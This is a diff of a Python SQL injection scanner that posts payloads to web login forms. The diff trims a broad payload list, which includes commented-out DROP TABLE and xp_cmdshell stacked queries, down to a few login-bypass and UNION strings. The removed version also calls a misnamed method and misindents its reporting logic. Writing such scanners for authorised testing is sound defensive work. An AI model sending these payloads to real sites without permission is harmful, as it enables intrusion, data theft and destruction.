@@ -1,46 +1,16 @@
 import requests
 import json
-import re
 
 
 class SQLInjectionScanner:
     """Class to scan for SQL Injection vulnerabilities in web forms."""
 
     PAYLOADS = [
-        # Boolean-based
-    "' OR '1'='1",
-    "' OR 1=1 --",
-    "' OR 'a'='a",
-    "' OR 1=1#",
-    
-    # Error-based
-    "' AND 1=CONVERT(int, (SELECT @@version)) --",
-    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58,97,58), (SELECT database()), CHAR(58,98,58), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) a) --",
-
-    # Time-based blind
-    "' OR SLEEP(5) --",
-    "'; WAITFOR DELAY '00:00:05' --",
-    "' AND IF(1=1, SLEEP(5), 0) --",
-    "' AND 1=IF(1=1, SLEEP(5), 0) --",
-    "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END)--",
-
-    # UNION-based
-    "' UNION SELECT NULL, NULL --",
-    "' UNION SELECT NULL, version() --",
-    "' UNION SELECT 1, user() --",
-    "' UNION SELECT 1, database() --",
-    
-    # Stacked queries (only works if the DB allows multiple queries) to dangerous to use, effects can be destructive. 
-    #"'; DROP TABLE users; --", deletes user table
-    #"'; SELECT pg_sleep(5); --", Postgres sleep, blind test
-    #"'; EXEC xp_cmdshell('whoami'); --", OS command execution (MSSQL) | High | Dangerous – system command
-
-    # Generic payloads
-    "\" OR \"\" = \"",
-    "') OR ('1'='1",
-    "admin' --",
-    "admin') --",
-    "' OR '' = '"
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "' OR 'a'='a",
+        "' UNION SELECT NULL, version() --",
+        "' UNION SELECT NULL, user() --"
     ]
 
     SEVERITY = {
@@ -49,62 +19,6 @@ class SQLInjectionScanner:
         "Low": "Minor issue with SQL query, unlikely to be exploitable.",
         "Safe": "No SQL Injection vulnerabilities detected on this page."
     }
-
-    SQL_ERRORS = [
-        r"SQL syntax.*MySQL",
-        r"Warning.*mysql_",
-        r"valid MySQL result",
-        r"MySqlClient\.",
-        r"com\.mysql\.jdbc\.exceptions",
-        r"PostgreSQL.*ERROR",
-        r"org\.postgresql\.util\.PSQLException",
-        r"PG::SyntaxError:",
-        r"SQLite/JDBCDriver",
-        r"System\.Data\.SqlClient\.SqlException",
-        r"Unclosed quotation mark after the character string",
-        r"Microsoft OLE DB Provider for SQL Server",
-        r"Incorrect syntax near",
-        r"ODBC SQL Server Driver",
-        r"ORA-\d{5}",  # Oracle error codes like ORA-00933
-        r"Oracle error",
-        r"Microsoft Access Driver",
-        r"JET Database Engine",
-        r"supplied argument is not a valid MySQL",
-        r"SQL error.*",
-    ]
-
-    DBMS_SIGNATURES = {
-        "MySQL": [
-            r"SQL syntax.*MySQL",
-            r"Warning.*mysql_",
-            r"MySqlClient\.",
-            r"valid MySQL result",
-            r"supplied argument is not a valid MySQL"
-        ],
-        "PostgreSQL": [
-            r"PostgreSQL.*ERROR",
-            r"org\.postgresql\.util\.PSQLException",
-            r"PG::SyntaxError:",
-            r"pg_sleep",
-        ],
-        "MSSQL": [
-            r"System\.Data\.SqlClient\.SqlException",
-            r"Unclosed quotation mark after the character string",
-            r"Microsoft OLE DB Provider for SQL Server",
-            r"Incorrect syntax near",
-            r"ODBC SQL Server Driver",
-            r"EXEC xp_cmdshell"
-        ],
-        "Oracle": [
-            r"ORA-\d{5}",
-            r"Oracle error"
-        ],
-        "SQLite": [
-            r"SQLite/JDBCDriver",
-            r"SQLITE_ERROR"
-        ]
-    }
-
 
     def __init__(self, mapped_data_file="scan_engine/scanner/mapped_data.json", results_file="scan_engine/reports/scan_results_json/sql_injection.json"):
         self.mapped_data_file = mapped_data_file
@@ -119,66 +33,42 @@ class SQLInjectionScanner:
         except (FileNotFoundError, json.JSONDecodeError) as e:
             print(f"⚠️ Error loading JSON file: {e}")
             return None
-    
-    def inter_dbms(self, response_text):
-        """Infer DBMS type from response content."""
-        for dbms, patterns in self.DBMS_SIGNATURES.items():
-            for pattern in patterns:
-                if re.search(pattern, response_text, re.IGNORECASE):
-                    return dbms
-        return "Unknown"
 
     def detect_sql_injection(self, target_url, form):
         """Test SQL Injection vulnerabilities for a given form."""
         print(f"\n🔍 Testing form at: {target_url}")
 
-        input_fields = form.get("inputs",{}) # fuzzing through all the inputs
+        post_data = {"username": "admin", "password": ""}
         sql_injection_found = False  # ✅ Flag to track vulnerability detection
 
-        base_data = {field: "test" for field in input_fields}
+        for payload in self.PAYLOADS:
+            post_data["password"] = payload
+            print(f"🛠️  Testing payload: {payload}")
 
-        for field in input_fields:
-            for payload in self.PAYLOADS:
-                test_data = base_data.copy()
-                test_data[field] = payload
-                print(f"🛠️  Testing payload: {payload}")
+            try:
+                response = requests.post(target_url, data=post_data, timeout=5)
 
-                try:
-                    response = requests.post(target_url, data=test_data, timeout=10)
+                if response.status_code == 200 and ("Welcome" in response.text or "Dashboard" in response.text):
+                    print(f"  ⚠️ Possible SQL Injection Detected at {target_url}!")
+                    print(f"  🔹 Vulnerable payload: {payload}")
 
-                    vulnerable = False
+                    if target_url not in self.scan_results:
+                        self.scan_results[target_url] = []
 
-                    if response.status_code == 200 and ("Welcome" in response.text or "Dashboard" in response.text):
-                        vulnerable = True
-                    else:
-                        for pattern in self.SQL_ERRORS:
-                            if re.search(pattern, response.text, re.IGNORECASE):
-                                vulnerable = True
-                                break
-                            if vulnerable:
-                                print(f"  ⚠️ Possible SQL Injection Detected at {target_url}!")
-                                print(f"  🔹 Vulnerable payload: {payload} in field: {field}")
+                    severity = "High"
 
-                                if target_url not in self.scan_results:
-                                    self.scan_results[target_url] = []
+                    self.scan_results[target_url].append({
+                        "payload": payload,
+                        "vulnerable": True,
+                        "severity": severity,
+                        "severity_description": self.SEVERITY[severity]
+                    })
 
-                                severity = "High"
-                                inferred_dbms = self.infer_dbms(response.text)
+                    sql_injection_found = True  #Set flag to True if SQLi is detected
+                    break 
 
-                                self.scan_results[target_url].append({
-                                    "payload": payload,
-                                    "vulnerable": True,
-                                    "severity": severity,
-                                    "severity_description": self.SEVERITY[severity],
-                                    "vulnerable_field": field,
-                                    "inferred_dbms": inferred_dbms
-                                })
-
-                                sql_injection_found = True  #Set flag to True if SQLi is detected
-                                break 
-
-                except requests.RequestException as e:
-                    print(f"  ❌ Error: {e}")
+            except requests.RequestException as e:
+                print(f"  ❌ Error: {e}")
 
         if not sql_injection_found:
             print(f"✅ No SQL Injection vulnerabilities found at {target_url}. Marking as Safe.")
@@ -217,7 +107,7 @@ class SQLInjectionScanner:
 
         for page in mapped_data.get("pages", []):
             for form in page.get("forms", []):
-                if form.get("method", "").upper() == "POST" and "inputs" in form and isinstance(form["inputs"], dict) and form["inputs"]:
+                if form["method"] == "POST" and "username" in form["inputs"] and "password" in form["inputs"]:
                     self.detect_sql_injection(form["action"], form)
 
         self.save_scan_results()
